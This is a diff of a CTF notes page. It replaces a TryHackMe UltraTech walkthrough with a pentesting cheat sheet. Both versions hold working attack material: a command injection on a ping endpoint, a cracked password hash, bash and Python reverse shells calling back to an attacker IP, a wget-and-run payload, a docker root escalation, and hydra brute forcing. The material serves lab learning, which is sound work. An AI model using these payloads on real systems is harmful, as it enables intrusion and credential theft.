@@ -1,166 +1,185 @@
----
-description: >-
-  The basics of Penetration Testing, Enumeration, Privilege Escalation and
-  WebApp testing
----
+# tyhackme Tricks
 
-# 1 - UltraTech
-
-Difficulty: Medium.
-
-Room Link --> [https://tryhackme.com/room/ultratech1](https://tryhackme.com/room/ultratech1)
-
-### Nmap scan:
+### tryhackme vpn tips
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
-nmap -p- -T4 -sV 10.10.239.176
+# incase you don't get a "Initialization sequence complete.
+sudo openvpn --data-ciphers AES-256-GCM:AES-128-GCM:CHACHA20-POLY1305:AES-256-CBC --config D31ng.ovpn
 
-Host is up (0.18s latency).
-Not shown: 65531 closed ports
-PORT      STATE SERVICE VERSION
-21/tcp    open  ftp     vsftpd 3.0.3
-22/tcp    open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
-8081/tcp  open  http    Node.js Express framework
-31331/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
-Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
+# when you get a: [read UDPv4 [EMSGSIZE Path-MTU=1440]: Message too long (fd=3,code=90)] error, it means the MTU size is too large.
+# open the config file and add this line of cmd.
+tun-mtu 1300
 ```
 {% endcode %}
 
-Using \[gobuster] to search for hidden directories.
+### base64, gpg
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
-gobuster dir -u http://10.10.239.176:31331 -w /usr/share/wordlists/dirb/common.txt -t 200 2>/dev/null
+cat [filename] | base64 -d > new.txt # to decode a base64 encoded file.
 
-===============================================================
-2023/08/15 09:30:51 Starting gobuster in directory enumeration mode
-===============================================================
-/.hta                 (Status: 403) [Size: 295]
-/.htaccess            (Status: 403) [Size: 300]
-/.htpasswd            (Status: 403) [Size: 300]
-/css                  (Status: 301) [Size: 321] [--> http://10.10.239.176:31331/css/]
-/favicon.ico          (Status: 200) [Size: 15086]
-/images               (Status: 301) [Size: 324] [--> http://10.10.239.176:31331/images/]
-/index.html           (Status: 200) [Size: 6092]
-/javascript           (Status: 301) [Size: 328] [--> http://10.10.239.176:31331/javascript/]
-/js                   (Status: 301) [Size: 320] [--> http://10.10.239.176:31331/js/]
-/robots.txt           (Status: 200) [Size: 53]
-/server-status        (Status: 403) [Size: 304]
+gpg --cipher-algo [encryption type] [encryption method] [file to encrypt] # encrypt files using gpg, example: gpg --cipher-algo AES256 --symmetric hash1.txt.
+# to decrypt: gpg <fileName>.
 
-===============================================================
-2023/08/15 09:31:04 Finished
-===============================================================
+# decrypting gpg encrypted files with john (jtr).
+gpg2john [encrypted_gpg_file] > [output_name]
+john wordlist=[location/name of wordlist] --format=gpg [name of hash we just created]
+
+# we can also import a pgp (public key) key/file and decrypt with gpg.
+gpg --import publickey # tries to decrypt the pubkey.
 ```
 {% endcode %}
 
-/robots.txt took me to "Sitemap: /utech\_sitemap.txt"
-
-/utech\_sitemap.txt took me to "/partners.html" which led to a login page, but we don't have any credential.
-
-/js took us to a dir with some .js files, taking a look at the "api.js" we found 2 functions making reference to 8081<"/ping" and "/auth"> directory. The "/ping" dir seem to be performing a ping with the "?ip=" parameter. ie ping?ip=
-
-Lets try pinging our tun0 ip, we can use `sudo tcpdump -i tun0 icmp` to listen for pings.
-
-and it went through, meaning the page is vulnerable to command injection (cmd injection).
-
-{% code overflow="wrap" lineNumbers="true" %}
-```
-http://10.10.239.176:8081/ping?ip=10.18.88.214
-
-PING 10.18.88.214 (10.18.88.214) 56(84) bytes of data. 64 bytes from 10.18.88.214: icmp_seq=1 ttl=63 time=163 ms --- 10.18.88.214 ping statistics --- 1 packets transmitted, 1 received, 0% packet loss, time 0ms rtt min/avg/max/mdev = 163.982/163.982/163.982/0.000 ms
-```
-{% endcode %}
-
-### Initial Access
-
-From here we can take 2 paths:
-
-1. Do a cmd injection on the page and list the files on it, then can the .db file or,
-2. Create a shell.sh script with a bash reverse shell in it, the execute it while listening on netcat.
-
-#### Path 1
-
-We use the \``ls` - backticks, so that our cmd takes precedence over the default ping function.
-
-{% code overflow="wrap" lineNumbers="true" %}
-```
-http://10.10.239.176:8081/ping?ip=`ls`
-
-we listed the file:
-ping: utech.db.sqlite: Name or service not known.
-```
-{% endcode %}
-
-Lets try to cat the content of the file.
-
-{% code overflow="wrap" lineNumbers="true" %}
-```
-http://10.10.239.176:8081/ping?ip=`cat%20utech.db.sqlite`
-
-
-we got:
-ping: ) ���(Mr00tf357a0c52799563c7c7b76c1e7543a32)Madmin0d0ea5111e3c1def594c1684e3b9be84: Parameter string not correctly encoded
-```
-{% endcode %}
-
-We can clearly see the username --> r00t and its pasword hash, then the user admin and its hash also. Since we need "r00t", we use \[hash-identifier] in kali to get the hash type.
+### zip2john
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
- HASH: f357a0c52799563c7c7b76c1e7543a32
+# we can use this utility to convert a passworded zip file into a crackable format for john.
+zip2john img.zip > hash.txt
+john hash.txt # to crack it.
 
-Possible Hashs:
-[+] MD5
-[+] Domain Cached Credentials - MD4(MD4(($pass)).(strtolower($username)))
+# After cracking the password, use 7z to input password.
+7z e img.zip
 ```
 {% endcode %}
 
-Its an MD5 hash, save it into a hash.txt file. I tried using john to crack, but john didnt work. So i used hashcat.
-
-`hashcat -m 0 hash.txt /usr/share/wordlist/rockyou.txt` - and cracked it.
-
-password --> n100906
-
-we got the password, lets login via ssh. And we got in.
-
-#### Path 2
-
-We create a shell.sh script.
-
-{% code title="shell.sh" overflow="wrap" lineNumbers="true" %}
-```bash
-# We use this bash onliner rev shell, and use my tun0 ip add and port 5555
-bash -i >& /dev/tcp/10.18.88.214/5555 0>&1
-```
-{% endcode %}
-
-Since we can execute cmds on the site, we use "wget" to download the script and then execute the shell.sh file with bash, while listening on netcat.
-
-First we have to host shell.sh with python: `python3 -m http.server`&#x20;
+### ssh2john
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
-http://10.10.239.176:8081/ping?ip=`wget 10.18.88.214/shell.sh` 
-http://10.10.239.176:8081/ping?ip=`bash shell.sh`
+# to crack an ssh priv key (id_rsa key) we use ssh2john to convert it to john format.
+ssh2john id_rsa > id_john
+
+# alternative to ssh2john is sed
+# we could use "sed" to achieve same result.
+sed 's/decodestring/decodebytes/' /usr/bin/ssh2john | python3 - id_rsa > hash_id
 ```
 {% endcode %}
 
-We get a shell :)
-
-### Priv Esc
-
-Since we are in docker group, we check gtfobin.
+### hash analyzer
 
 {% code overflow="wrap" lineNumbers="true" %}
 ```bash
-docker image ls # we have a bash image.
-docker run -v /:/mnt --rm -it bash chroot /mnt sh # we get root.
+# identify hashes
+https://www.tunnelsup.com/hash-analyzer/
 ```
 {% endcode %}
 
-We can use locate to find the root user ssh private key.
+### sql
 
-`locate --all "id_rsa" /` - we get the key.
+```sql
+show databases;
+use <name>
+show tables;
+describe <table_name> # display all the columns.
+```
 
-Done.
+### ASN - Autonomous System Numbers
+
+#### ASN lookup:
+
+Get info about a company / domain ASN.
+
+* [https://hackertarget.com/as-ip-lookup/](https://hackertarget.com/as-ip-lookup/)
+* [https://mxtoolbox.com/asn.aspx](https://mxtoolbox.com/asn.aspx)
+* whois lookup: [https://lookup.icann.org/](https://lookup.icann.org/en/lookup)
+* ip history, dns full info of a site: [https://viewdns.info/](https://viewdns.info/)
+
+You can find more Shodan Dorks on GitHub.
+
+```bash
+# we can search using the ASN filter.
+ASN:AS14061
+product:MySQL
+ASN:AS14061 product:MySQL or product:NGINX # we can combine 2 search into 1.
+vuln:ms17-010 # search for IP addresses vulnerable to the eternalblue exploit.
+vuln:CVE-2014-0160 # heartbleed vuln.
+country:US
+asn:AS15169 country:"US" city:"Los Angeles"
+has_screenshot:true encrypted attention
+screenshot.label:ics
+http.favicon.hash:-1776962843
+
+```
+
+{% hint style="success" %}
+Note: you can always use the `ctrl+f` feature to find for important stuffs from a website source code. Like in the imaage below.
+
+
+{% endhint %}
+
+<figure><img src=".gitbook/assets/image (6).png" alt=""><figcaption><p>ctrl+f</p></figcaption></figure>
+
+### Bypassing some python restriction to get reverse shell
+
+In this room: [https://tryhackme.com/room/pythonplayground](https://tryhackme.com/room/pythonplayground) we had to bypass some python keywords restrction in order to get reverse shell.
+
+Walkthrough --> [https://github.com/nonickid/Python-Playground-write-up](https://github.com/nonickid/Python-Playground-write-up)
+
+```python
+# setup a nc listener.
+nc -nvlp 7345
+
+# use the python code.
+o = __import__('os')
+s = __import__('socket')
+p = __import__('subprocess')
+
+k = s.socket(s.AF_INET,s.SOCK_STREAM)
+k.connect(("10.18.88.214",7345))
+o.dup2(k.fileno(),0)
+o.dup2(k.fileno(),1)
+o.dup2(k.fileno(),2)
+c = p.call(["/bin/sh","-i"]);
+
+# we got shell.
+```
+
+### Bruteforcing Http Login Forms with hydra
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# template cmd..
+hydra -l <username> -P <wordlist> 10.10.241.210 http-post-form "/<path_to_go>:username=^USER^&password=^PASS^:F=incorrect" -V
+# example.
+hydra -l molly -P /usr/share/wordlists/rockyou.txt 10.10.241.210 http-post-form "/login:username=^USER^&password=^PASS^:F=Your username or password is incorrect." -t 10
+```
+{% endcode %}
+
+### Steganography
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+# There are many tools used to view embedded files or text on Images.
+# Some are:
+xxd img.png
+strings img.pg
+binwalk -e img.png
+steghide extract -sf img.png
+https://futureboy.us/stegano/decinput.html
+exiftool img.png
+```
+{% endcode %}
+
+### Gobuster / FFUF / dirsearch
+
+{% code overflow="wrap" lineNumbers="true" %}
+```bash
+gobuster dir -u http://10.10.138.195:8080/ -x php,html,txt,aspx,asp -t 15 -q -w /usr/share/wordlists/dirb/common.txt
+
+dirsearch -u http://blueprint.thm:8080/ -e php,cgi,html,txt -x 400,401,403 -r -t 100
+
+```
+{% endcode %}
+
+
+
+
+
+
+
+
+
+
+
